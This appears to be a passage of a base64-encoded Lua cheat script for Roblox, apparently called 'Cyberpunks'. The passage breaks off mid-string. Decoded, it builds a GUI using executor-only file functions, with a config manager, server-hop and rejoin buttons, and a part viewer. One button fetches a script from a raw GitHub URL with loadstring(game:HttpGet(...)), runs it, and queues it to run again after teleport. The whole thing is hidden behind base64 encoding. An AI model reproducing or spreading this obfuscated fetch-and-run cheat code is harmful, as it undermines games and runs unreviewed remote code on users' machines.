gPSB0aXAKICAgICAgICAgICAgYnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpIHRpcC5WaXNpYmxlID0gdHJ1ZSBlbmQpCiAgICAgICAgICAgIGJ0bi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKSB0aXAuVmlzaWJsZSA9IGZhbHNlIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIE1haW5GcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gY29sb3IKICAgICAgICAgICAgICAgIFJpZ2h0UGFuZWwuQmFja2dyb3VuZENvbG9yMyA9IGNvbG9yCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCksICJOZW9uIFJlZCIpCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApLCAiTmVvbiBHcmVlbiIpCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigwLCAwLCAyNTUpLCAiTmVvbiBCbHVlIikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMjU1KSwgIk5lb24gUGluayIpCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDI1NSksICJOZW9uIEN5YW4iKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApLCAiTmVvbiBZZWxsb3ciKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCAxMjgsIDApLCAiTmVvbiBPcmFuZ2UiKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMTI4LCAwLCAyNTUpLCAiTmVvbiBQdXJwbGUiKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMTUsIDE1LCAyMCksICJEZWZhdWx0IikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLCAiQmxhY2siKQogICAgZW5kCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuU2V0dGluZ3MsICJDb25maWd1cmF0aW9uIE1hbmFnZXIiLCAzKQogICAgCiAgICBsb2NhbCBDb25maWdGb2xkZXIgPSAiQ3liZXJwdW5rc19Db25maWdzIgogICAgaWYgbWFrZWZvbGRlciB0aGVuIHBjYWxsKGZ1bmN0aW9uKCkgbWFrZWZvbGRlcihDb25maWdGb2xkZXIpIGVuZCkgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIFNhdmVDb25maWcobmFtZSkKICAgICAgICBpZiBub3Qgd3JpdGVmaWxlIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGxvY2FsIGpzb25Db25maWcgPSB7fQogICAgICAgIGZvciBrLCB2IGluIHBhaXJzKENvbmZpZykgZG8KICAgICAgICAgICAgaWYgdHlwZW9mKHYpID09ICJFbnVtSXRlbSIgdGhlbgogICAgICAgICAgICAgICAganNvbkNvbmZpZ1trXSA9IHtUeXBlID0gIkVudW0iLCBOYW1lID0gdi5OYW1lLCBFbnVtVHlwZSA9IHRvc3RyaW5nKHYuRW51bVR5cGUpfQogICAgICAgICAgICBlbHNlaWYgdHlwZW9mKHYpID09ICJDb2xvcjMiIHRoZW4KICAgICAgICAgICAgICAgIGpzb25Db25maWdba10gPSB7VHlwZSA9ICJDb2xvcjMiLCBSID0gdi5SLCBHID0gdi5HLCBCID0gdi5CfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBqc29uQ29uZmlnW2tdID0gdgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBwY2FsbChmdW5jdGlvbigpIHdyaXRlZmlsZShDb25maWdGb2xkZXIgLi4gIi8iIC4uIG5hbWUgLi4gIi5qc29uIiwgSHR0cFNlcnZpY2U6SlNPTkVuY29kZShqc29uQ29uZmlnKSkgZW5kKQogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gTG9hZENvbmZpZyhuYW1lKQogICAgICAgIGlmIG5vdCByZWFkZmlsZSBvciBub3QgaXNmaWxlKENvbmZpZ0ZvbGRlciAuLiAiLyIgLi4gbmFtZSAuLiAiLmpzb24iKSB0aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCBjb250ZW50ID0gcmVhZGZpbGUoQ29uZmlnRm9sZGVyIC4uICIvIiAuLiBuYW1lIC4uICIuanNvbiIpCiAgICAgICAgbG9jYWwgZGVjb2RlZCA9IEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUoY29udGVudCkKICAgICAgICAKICAgICAgICBmb3IgaywgdiBpbiBwYWlycyhkZWNvZGVkKSBkbwogICAgICAgICAgICBpZiBDb25maWdba10gfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgIGlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdi5UeXBlID09ICJFbnVtIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgdmFsID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gRW51bVt0b3N0cmluZyh2LkVudW1UeXBlKTptYXRjaCgiRW51bSUuKCV3KykiKV0gZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIHZhbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZ1trXSA9IHZhbFt2Lk5hbWVdCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIENvbmZpZ1trXSA9IEVudW0uS2V5Q29kZVt2Lk5hbWVdIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2VpZiB0eXBlKHYpID09ICJ0YWJsZSIgYW5kIHYuVHlwZSA9PSAiQ29sb3IzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnW2tdID0gQ29sb3IzLm5ldyh2LlIsIHYuRywgdi5CKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIENvbmZpZ1trXSA9IHYKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBVcGRhdGUgVUkKICAgICAgICBmb3IgaywgYnRuIGluIHBhaXJzKFRvZ2dsZUJ1dHRvbnMpIGRvCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnW2tdIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIGVuZAogICAgICAgIGZvciBrLCBidG4gaW4gcGFpcnMoS2V5YmluZEJ1dHRvbnMpIGRvCiAgICAgICAgICAgIGxvY2FsIGtleU5hbWUgPSBDb25maWdba10uTmFtZQogICAgICAgICAgICBpZiBDb25maWdba10gPT0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbiBrZXlOYW1lID0gIi4uLiIgZW5kCiAgICAgICAgICAgIGJ0bi5UZXh0ID0ga2V5TmFtZQogICAgICAgIGVuZAogICAgICAgIGZvciBrLCBpbnB1dCBpbiBwYWlycyhJbnB1dEJveGVzKSBkbwogICAgICAgICAgICBpbnB1dC5UZXh0ID0gdG9zdHJpbmcoQ29uZmlnW2tdKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbgogICAgICAgICAgICBfRy5Tbm93R3VpLkVuYWJsZWQgPSBub3QgQ29uZmlnLkRpc2FibGVTbm93CiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgVXBkYXRlVGhlbWUoQ3VycmVudFRoZW1lQ29sb3IpCiAgICAgICAgCiAgICAgICAgLS0gQXBwbHkgQ3Vyc29yCiAgICAgICAgaWYgQ29uZmlnLkN1c3RvbUN1cnNvcklkIGFuZCBDb25maWcuQ3VzdG9tQ3Vyc29ySWQgfj0gIiIgdGhlbgogICAgICAgICAgICAgbG9jYWwgdmFsID0gQ29uZmlnLkN1c3RvbUN1cnNvcklkCiAgICAgICAgICAgICBpZiB0b251bWJlcih2YWwpIHRoZW4KICAgICAgICAgICAgICAgIG1vdXNlLkljb24gPSAicmJ4YXNzZXRpZDovLyIgLi4gdmFsCiAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBtb3VzZS5JY29uID0gdmFsCiAgICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGRvCiAgICBsb2NhbCBDb25maWdGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgQ29uZmlnRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAyNTApCiAgICBDb25maWdGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgQ29uZmlnRnJhbWUuTGF5b3V0T3JkZXIgPSA0CiAgICBDb25maWdGcmFtZS5QYXJlbnQgPSBQYWdlcy5TZXR0aW5ncwogICAgCiAgICBsb2NhbCBDRk5hbWUgPSBJbnN0YW5jZS5uZXcoIlRleHRCb3giKQogICAgQ0ZOYW1lLlNpemUgPSBVRGltMi5uZXcoMC42NSwgMCwgMCwgMjUpCiAgICBDRk5hbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICBDRk5hbWUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBDRk5hbWUuUGxhY2Vob2xkZXJUZXh0ID0gIkNvbmZpZyBOYW1lLi4uIgogICAgQ0ZOYW1lLlRleHQgPSAiIgogICAgQ0ZOYW1lLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBDRk5hbWUuVGV4dFNpemUgPSAxMAogICAgQ0ZOYW1lLlBhcmVudCA9IENvbmZpZ0ZyYW1lCiAgICAKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBDRk5hbWUpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkKICAgIAogICAgbG9jYWwgU2F2ZUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBTYXZlQnRuLlNpemUgPSBVRGltMi5uZXcoMC4zLCAwLCAwLCAyNSkKICAgIFNhdmVCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC43LCAwLCAwLCAwKQogICAgU2F2ZUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIFNhdmVCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBTYXZlQnRuLlRleHQgPSAiU0FWRSIKICAgIFNhdmVCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBTYXZlQnRuLlRleHRTaXplID0gMTAKICAgIFNhdmVCdG4uUGFyZW50ID0gQ29uZmlnRnJhbWUKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBTYXZlQnRuKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpCiAgICAKICAgIGxvY2FsIExpc3RGcmFtZSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgTGlzdEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgLTM1KQogICAgTGlzdEZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDM1KQogICAgTGlzdEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgTGlzdEZyYW1lLlNjcm9sbEJhclRoaWNrbmVzcyA9IDIKICAgIExpc3RGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBMaXN0RnJhbWUuQXV0b21hdGljQ2FudmFzU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICBMaXN0RnJhbWUuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgTGlzdEZyYW1lLlBhcmVudCA9IENvbmZpZ0ZyYW1lCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgTGlzdEZyYW1lKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpCiAgICBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIExpc3RGcmFtZSkuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDIpCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIFJlZnJlc2hDb25maWdzKCkKICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhMaXN0RnJhbWU6R2V0Q2hpbGRyZW4oKSkgZG8gaWYgdjpJc0EoIkZyYW1lIikgb3IgdjpJc0EoIlRleHRCdXR0b24iKSB0aGVuIHY6RGVzdHJveSgpIGVuZCBlbmQKICAgICAgICBpZiBsaXN0ZmlsZXMgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgXywgZmlsZSBpbiBwYWlycyhsaXN0ZmlsZXMoQ29uZmlnRm9sZGVyKSkgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBuYW1lID0gZmlsZTptYXRjaCgiKFteXFwvXSspJS5qc29uJCIpCiAgICAgICAgICAgICAgICAgICAgaWYgbmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFJvdyA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgICAgICAgICAgICAgICAgICBSb3cuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAyMCkKICAgICAgICAgICAgICAgICAgICAgICAgUm93LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIFJvdy5QYXJlbnQgPSBMaXN0RnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMSwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgICAgICAgICAgICAgICAgICBidG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0ID0gbmFtZQogICAgICAgICAgICAgICAgICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRTaXplID0gOQogICAgICAgICAgICAgICAgICAgICAgICBidG4uUGFyZW50ID0gUm93CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIEJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQkNvcm5lci5QYXJlbnQgPSBidG4KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvYWRDb25maWcobmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGVsQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgICAgICAgICAgICAgZGVsQnRuLlNpemUgPSBVRGltMi5uZXcoMC4xNSwgMCwgMSwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZGVsQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAuODUsIDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGRlbEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICAgICAgICAgICAgICAgICAgZGVsQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgICAgICBkZWxCdG4uVGV4dCA9ICLwn5eRIgogICAgICAgICAgICAgICAgICAgICAgICBkZWxCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgICAgICAgICAgZGVsQnRuLlRleHRTaXplID0gMTAKICAgICAgICAgICAgICAgICAgICAgICAgZGVsQnRuLlBhcmVudCA9IFJvdwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBEQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIERDb3JuZXIuUGFyZW50ID0gZGVsQnRuCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBkZWxCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZWxmaWxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGRlbGZpbGUoZmlsZSkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJvdzpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIFNhdmVCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgQ0ZOYW1lLlRleHQgfj0gIiIgdGhlbgogICAgICAgICAgICBTYXZlQ29uZmlnKENGTmFtZS5UZXh0KQogICAgICAgICAgICBDRk5hbWUuVGV4dCA9ICIiCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgIFJlZnJlc2hDb25maWdzKCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgUmVmcmVzaENvbmZpZ3MoKQogICAgZW5kCiAgICAKICAgIC0tIEF1dG8gTG9hZCBTY3JpcHQgQnV0dG9uIChsb2FkcyBDeWJlcnB1bmtzLmx1YSBmcm9tIEdpdEh1YikKICAgIGRvCiAgICAgICAgbG9jYWwgQ3liZXJTY3JpcHRCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIEN5YmVyU2NyaXB0QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgQ3liZXJTY3JpcHRCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgQ3liZXJTY3JpcHRCdG4uVGV4dCA9ICJBdXRvIExvYWQgU2NyaXB0IgogICAgICAgIEN5YmVyU2NyaXB0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIEN5YmVyU2NyaXB0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEN5YmVyU2NyaXB0QnRuLlRleHRTaXplID0gMTAKICAgICAgICBDeWJlclNjcmlwdEJ0bi5MYXlvdXRPcmRlciA9IDcKICAgICAgICBDeWJlclNjcmlwdEJ0bi5QYXJlbnQgPSBQYWdlcy5TZXR0aW5ncwogICAgICAgIAogICAgICAgIGxvY2FsIENTQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIENTQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIENTQ29ybmVyLlBhcmVudCA9IEN5YmVyU2NyaXB0QnRuCiAgICAgICAgCiAgICAgICAgQ3liZXJTY3JpcHRCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHNjcmlwdF90b19ydW4gPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dVTktOT1cvQ3liZXJwdW5rcy9yZWZzL2hlYWRzL21haW4vQ3liZXJwdW5rcy5sdWEiKSkoKVtbCiAgICBwcmludCgiZGVidWciKQogICAgLS0geW91ciBzb3VyY2UKXV0KCmlmIHN5biBhbmQgc3luLnF1ZXVlX29uX3RlbGVwb3J0IHRoZW4KICAgIHN5bi5xdWV1ZV9vbl90ZWxlcG9ydChzY3JpcHRfdG9fcnVuKQplbHNlaWYgcXVldWVfb25fdGVsZXBvcnQgdGhlbgogICAgcXVldWVfb25fdGVsZXBvcnQoc2NyaXB0X3RvX3J1bikKZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5TZXR0aW5ncywgIkF1dG8gTG9hZCBDb25maWciLCAiQXV0b0xvYWRDb25maWciLCA5KQogICAgY3JlYXRlSW5wdXQoUGFnZXMuU2V0dGluZ3MsICJDb25maWcgTmFtZSIsICJBdXRvTG9hZENvbmZpZ05hbWUiLCAxMCkKICAgIAogICAgZG8KICAgIGxvY2FsIEhvcEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBIb3BCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIEhvcEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIEhvcEJ0bi5UZXh0ID0gIlNFUlZFUiBIT1AiCiAgICBIb3BCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBIb3BCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBIb3BCdG4uVGV4dFNpemUgPSAxMAogICAgSG9wQnRuLkxheW91dE9yZGVyID0gMTAKICAgIEhvcEJ0bi5QYXJlbnQgPSBQYWdlcy5TZXR0aW5ncwogICAgCiAgICBsb2NhbCBIQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIEhDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgSENvcm5lci5QYXJlbnQgPSBIb3BCdG4KICAgIAogICAgSG9wQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFBsYWNlSWQgPSBnYW1lLlBsYWNlSWQKICAgICAgICBsb2NhbCBIdHRwID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCiAgICAgICAgaWYgSHR0cCBhbmQgZ2FtZS5IdHRwR2V0IHRoZW4KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgU2VydmVycyA9IEh0dHA6SlNPTkRlY29kZShnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2FtZXMucm9ibG94LmNvbS92MS9nYW1lcy8iLi5QbGFjZUlkLi4iL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAwIikpCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhTZXJ2ZXJzLmRhdGEpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5wbGF5aW5nIH49IHYubWF4UGxheWVycyBhbmQgdi5pZCB+PSBnYW1lLkpvYklkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZShQbGFjZUlkLCB2LmlkLCBwbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5k" .. "KQogICAgZW5kCgogICAgZG8KICAgIGxvY2FsIFJlam9pbkJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBSZWpvaW5CdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIFJlam9pbkJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIFJlam9pbkJ0bi5UZXh0ID0gIlJFSk9JTiBTRVJWRVIiCiAgICBSZWpvaW5CdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBSZWpvaW5CdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBSZWpvaW5CdG4uVGV4dFNpemUgPSAxMAogICAgUmVqb2luQnRuLkxheW91dE9yZGVyID0gMTEKICAgIFJlam9pbkJ0bi5QYXJlbnQgPSBQYWdlcy5TZXR0aW5ncwogICAgCiAgICBsb2NhbCBSSkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBSSkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBSSkNvcm5lci5QYXJlbnQgPSBSZWpvaW5CdG4KICAgIAogICAgUmVqb2luQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIik6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoZ2FtZS5QbGFjZUlkLCBnYW1lLkpvYklkLCBwbGF5ZXIpCiAgICBlbmQpCiAgICBlbmQKICAgIAogICAgZG8KICAgIGxvY2FsIFBhcnRWaWV3ZXJCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgUGFydFZpZXdlckJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgUGFydFZpZXdlckJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIFBhcnRWaWV3ZXJCdG4uVGV4dCA9ICJQQVJUIFZJRVdFUiAoRGVidWcpIgogICAgUGFydFZpZXdlckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIFBhcnRWaWV3ZXJCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBQYXJ0Vmlld2VyQnRuLlRleHRTaXplID0gMTAKICAgIFBhcnRWaWV3ZXJCdG4uTGF5b3V0T3JkZXIgPSAxMS41CiAgICBQYXJ0Vmlld2VyQnRuLlBhcmVudCA9IFBhZ2VzLlNldHRpbmdzCiAgICAKICAgIGxvY2FsIFBWQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFBWQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFBWQ29ybmVyLlBhcmVudCA9IFBhcnRWaWV3ZXJCdG4KICAgIAogICAgUGFydFZpZXdlckJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgUGFydFZpZXdlckVuYWJsZWQgdGhlbgogICAgICAgICAgICBQYXJ0Vmlld2VyRW5hYmxlZCA9IHRydWUKICAgICAgICAgICAgUGFydFZpZXdlckJ0bi5UZXh0ID0gIlBBUlQgVklFV0VSOiBPTiIKICAgICAgICAgICAgUGFydFZpZXdlckJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTAsIDIwMCwgNTApCiAgICAgICAgICAgIFN0YXJ0UGFydFZpZXdlcigpCiAgICAgICAgZWxzZQogICAgICAgICAgICBQYXJ0Vmlld2VyRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgIFBhcnRWaWV3ZXJCdG4uVGV4dCA9ICJQQVJUIFZJRVdFU